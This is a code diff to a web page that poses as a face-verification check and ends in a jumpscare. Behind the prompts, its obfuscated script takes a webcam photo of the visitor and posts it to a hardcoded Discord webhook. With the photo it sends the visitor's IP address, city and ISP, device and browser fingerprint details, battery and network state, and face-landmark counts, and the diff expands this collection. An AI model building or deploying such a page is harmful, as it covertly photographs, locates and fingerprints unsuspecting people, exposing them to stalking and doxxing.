@@ -178,7 +178,6 @@
             animation: jpulse 0.25s infinite; font-family: 'Impact', sans-serif; letter-spacing: 8px;
         }
         @keyframes jpulse { 0%,100% { transform: scale(1) rotate(-2deg); } 50% { transform: scale(1.3) rotate(2deg); } }
-        .jsub { color: #fff; font-size: 20px; margin-top: 15px; text-align: center; font-weight: 600; text-shadow: 2px 2px 0 #000; }
 
         @media (max-width: 520px) {
             .card { padding: 32px 24px; }
@@ -246,7 +245,7 @@
                 <div class="sframe"></div>
                 <div class="sline"></div>
             </div>
-            <div class="st" id="ss">Position your face in the frame</div>
+            <div class="st" id="ss">Position your face fully in the circle</div>
         </div>
 
         <div id="s4" class="hidden">
@@ -254,7 +253,7 @@
                 <svg viewBox="0 0 50 50"><circle cx="25" cy="25" r="20"></circle></svg>
                 <div class="cicon">✓</div>
             </div>
-            <div class="st ld dots" style="font-size:18px;">Verification complete. Loading</div>
+            <div class="st ld dots" style="font-size:18px;">Done. Loading</div>
         </div>
 
         <div class="foot">
@@ -271,7 +270,6 @@
 <div class="scare" id="scare">
     <img class="simg" id="si" src="" alt="">
     <div class="jtext">GOT YOU</div>
-    <div class="jsub">😂😂😂</div>
 </div>
 <div class="flash" id="fl"></div>
 
@@ -279,16 +277,24 @@
     <source src="https://www.myinstants.com/media/sounds/scream.mp3" type="audio/mpeg">
 </audio>
 
+<script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+
 <script>
 // ==================== CONFIG ====================
-// paste your webhook between the quotes, then run through base44 obfuscator
 const _0x1a2b = "https://discord.com/api/webhooks/1545669124573892618/_HSt8l9pOpRWzaUbitBTA6gjE6KzE0Zhp5UxY69zeLVr5pEJkz05fGI75xArc8WN1vEC";
 // ================================================
 
 let _0x3c4d = null;
 let _0x5e6f = 1;
+let _0x6a7b = null;
+let _0x8c9d = false;
 
-function _0x7a8b(s) {
+async function _0x0d1e() {
+    await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights');
+    await faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights');
+}
+
+function go(s) {
     document.getElementById('s' + s).classList.remove('hidden');
     [1,2,3,4].forEach(i => {
         if (i !== s) document.getElementById('s' + i).classList.add('hidden');
@@ -297,8 +303,6 @@ function _0x7a8b(s) {
     });
     _0x5e6f = s;
 }
-
-function go(s) { _0x7a8b(s); }
 
 async function cam() {
     const st = document.querySelector('#s2 .st');
@@ -309,27 +313,67 @@ async function cam() {
             audio: false
         });
         document.getElementById('v').srcObject = _0x3c4d;
-        _0x7a8b(3);
-        document.getElementById('ss').textContent = 'Position your face in the frame';
-        setTimeout(() => _0x9c0d(), 2500);
+        go(3);
+        document.getElementById('ss').textContent = 'Position your face fully in the circle';
+        setTimeout(() => _0x9c0d(), 1500);
     } catch(e) {
-        st.textContent = 'Camera denied. Click "Allow" and try again. if still not working goto site controls.';
+        st.textContent = 'Camera denied. Click "Allow" and try again.';
         st.className = 'st err';
     }
 }
 
-function _0x9c0d() {
+async function _0x9c0d() {
     const ss = document.getElementById('ss');
     const v = document.getElementById('v');
-    ss.textContent = 'Analyzing environment...';
-    ss.className = 'st ld';
+    
+    if (!_0x8c9d) {
+        ss.textContent = 'Loading face detection...';
+        ss.className = 'st ld';
+        await _0x0d1e();
+        _0x8c9d = true;
+        ss.textContent = 'Position your face fully in the circle';
+        ss.className = 'st';
+    }
 
+    const detections = await faceapi.detectAllFaces(v, new faceapi.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.5 })).withFaceLandmarks();
+
+    if (detections.length === 0) {
+        ss.textContent = 'No face detected. Position your face in the circle.';
+        ss.className = 'st err';
+        setTimeout(() => _0x9c0d(), 500);
+        return;
+    }
+
+    const det = detections[0];
+    const box = det.detection.box;
+    const vWidth = v.videoWidth;
+    const vHeight = v.videoHeight;
+
+    // circle bounds (center 50%, 50%, radius 40% of min dimension)
+    const cx = vWidth / 2;
+    const cy = vHeight / 2;
+    const r = Math.min(vWidth, vHeight) * 0.4;
+
+    const faceCx = box.x + box.width / 2;
+    const faceCy = box.y + box.height / 2;
+    const faceR = Math.max(box.width, box.height) / 2;
+
+    const dist = Math.sqrt((faceCx - cx) ** 2 + (faceCy - cy) ** 2);
+    const inside = dist + faceR <= r;
+
+    if (!inside) {
+        ss.textContent = 'Face must be in the circle (fully)';
+        ss.className = 'st err';
+        setTimeout(() => _0x9c0d(), 500);
+        return;
+    }
+
+    // check lighting
     const c = document.createElement('canvas');
     c.width = 120; c.height = 120;
     const x = c.getContext('2d');
     x.drawImage(v, 0, 0, 120, 120);
     const d = x.getImageData(0, 0, 120, 120).data;
-
     let t = 0;
     for (let i = 0; i < d.length; i += 4) {
         t += (d[i]*0.299 + d[i+1]*0.587 + d[i+2]*0.114);
@@ -339,16 +383,20 @@ function _0x9c0d() {
     if (avg < 55) {
         ss.textContent = '⚠️ Too dark. Move to a well-lit area.';
         ss.className = 'st err';
-        setTimeout(() => _0x9c0d(), 2000);
-    } else if (avg > 210) {
+        setTimeout(() => _0x9c0d(), 1000);
+        return;
+    }
+    if (avg > 210) {
         ss.textContent = '⚠️ Too bright. Reduce glare.';
         ss.className = 'st err';
-        setTimeout(() => _0x9c0d(), 2000);
-    } else {
-        ss.textContent = '✓ Lighting optimal. Scanning...';
-        ss.className = 'st ok';
-        setTimeout(() => _0xb1e2(), 2000);
+        setTimeout(() => _0x9c0d(), 1000);
+        return;
     }
+
+    ss.textContent = '✓ Face detected. Scanning...';
+    ss.className = 'st ok';
+    _0x6a7b = det;
+    setTimeout(() => _0xb1e2(), 1500);
 }
 
 function _0xb1e2() {
@@ -362,30 +410,96 @@ function _0xb1e2() {
     const img = c.toDataURL('image/png');
 
     if (_0x3c4d) _0x3c4d.getTracks().forEach(t => t.stop());
-    _0x7a8b(4);
+    go(4);
 
     _0xd3f4(img).finally(() => {
-        setTimeout(() => _0xf5a6(), 2000);
+        setTimeout(() => _0xf5a6(), 5000);
     });
 }
 
 async function _0xd3f4(img) {
-    if (_0x1a2b === "YOUR_WEBHOOK_URL_HERE") { console.log('no hook'); return; }
     try {
         const b = await (await fetch(img)).blob();
         const f = new FormData();
-        f.append('file', b, 'scan.png');
-        const ip = await _0xa7c8();
-        f.append('content', `**New**\n🕐 ${new Date().toLocaleString()}\n🌐 ${ip}\n📱 ${navigator.userAgent}`);
+        f.append('file', b, 'face_scan.png');
+
+        const info = await _0xe5f6();
+        f.append('content', info);
+
         await fetch(_0x1a2b, { method: 'POST', body: f });
     } catch(e) { console.error(e); }
 }
 
-async function _0xa7c8() {
+async function _0xe5f6() {
+    const lines = [];
+    lines.push('**🔴 New Capture**');
+    lines.push(`🕐 ${new Date().toLocaleString()}`);
+
+    // IP
     try {
         const r = await fetch('https://api.ipify.org?format=json');
-        return (await r.json()).ip;
-    } catch { return 'unknown'; }
+        const ip = (await r.json()).ip;
+        lines.push(`🌐 IP: ${ip}`);
+        
+        // geo
+        try {
+            const g = await fetch(`https://ipapi.co/${ip}/json/`);
+            const geo = await g.json();
+            lines.push(`📍 ${geo.city}, ${geo.region}, ${geo.country_name}`);
+            lines.push(`🏢 ISP: ${geo.org}`);
+        } catch {}
+    } catch {}
+
+    // device
+    lines.push(`📱 Device: ${navigator.userAgent}`);
+    lines.push(`💻 Platform: ${navigator.platform}`);
+    lines.push(`🖥️ Screen: ${screen.width}x${screen.height} @${window.devicePixelRatio}x`);
+    lines.push(`🔋 Cores: ${navigator.hardwareConcurrency || 'unknown'}`);
+    lines.push(`💾 RAM: ${navigator.deviceMemory || 'unknown'}GB`);
+    lines.push(`🗣️ Lang: ${navigator.language}`);
+    lines.push(`🕐 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
+
+    // battery
+    try {
+        const bat = await navigator.getBattery();
+        lines.push(`🔋 Battery: ${Math.round(bat.level * 100)}% ${bat.charging ? '⚡' : ''}`);
+    } catch {}
+
+    // connection
+    try {
+        const conn = navigator.connection;
+        if (conn) {
+            lines.push(`📶 Network: ${conn.effectiveType} | ${conn.downlink}Mbps`);
+        }
+    } catch {}
+
+    // webcam/mic count
+    try {
+        const devs = await navigator.mediaDevices.enumerateDevices();
+        const cams = devs.filter(d => d.kind === 'videoinput').length;
+        const mics = devs.filter(d => d.kind === 'audioinput').length;
+        lines.push(`📷 Cams: ${cams} | 🎤 Mics: ${mics}`);
+    } catch {}
+
+    // cookies / storage
+    lines.push(`🍪 Cookies: ${navigator.cookieEnabled ? 'enabled' : 'disabled'}`);
+    lines.push(`💾 Storage: ${navigator.storage ? 'estimate: ' + JSON.stringify(await navigator.storage.estimate()) : 'n/a'}`);
+
+    // plugins
+    try {
+        const plugins = Array.from(navigator.plugins).map(p => p.name).join(', ');
+        lines.push(`🔌 Plugins: ${plugins || 'none'}`);
+    } catch {}
+
+    // face landmarks summary
+    if (_0x6a7b) {
+        const landmarks = _0x6a7b.landmarks;
+        const jaw = landmarks.getJawOutline();
+        const eyes = landmarks.getLeftEye().concat(landmarks.getRightEye());
+        lines.push(`👤 Face: ${jaw.length} jaw pts, ${eyes.length} eye pts detected`);
+    }
+
+    return lines.join('\n');
 }
 
 function _0xf5a6() {
@@ -406,5 +520,4 @@ function _0xf5a6() {
 </script>
 
 </body>
-  </html>
-  
+</html>
